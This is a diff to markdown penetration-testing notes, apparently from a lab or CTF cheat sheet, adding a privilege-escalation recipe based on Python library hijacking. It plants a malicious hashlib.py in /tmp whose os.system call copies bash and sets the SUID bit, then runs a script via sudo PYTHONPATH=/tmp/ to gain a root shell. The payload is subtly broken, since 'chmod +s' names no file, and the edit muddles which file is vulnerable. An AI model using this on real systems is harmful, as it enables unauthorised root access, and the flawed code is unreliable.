@@ -26,7 +26,7 @@ During this scan only half packet is sent and reset flag is sent at end. This al
 
 ##### Privilege Escalation Via Python Library Hijacking
 ```
-Vulnerable script
+Vulnerable hashlib.py
 import hashlib
 
 def hashing(passw):
@@ -57,6 +57,16 @@ if __name__ == "__main__":
 
 ```
 
-Here, we dont have write permission on the script.py file but have write perm in the library hashlib
+Here, we dont have write permission on the hashlib.py file but have write perm in the library hashlib
+
+####Create following file in /tmp directory with SUID flag set
+```
+hashlib.py
+#!/usr/bin/env python3
+
+import os
+os.system("cp /bin/bash /tmp/bash; chmod +s; /tmp/bash")
+
+```
 
 ##### sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
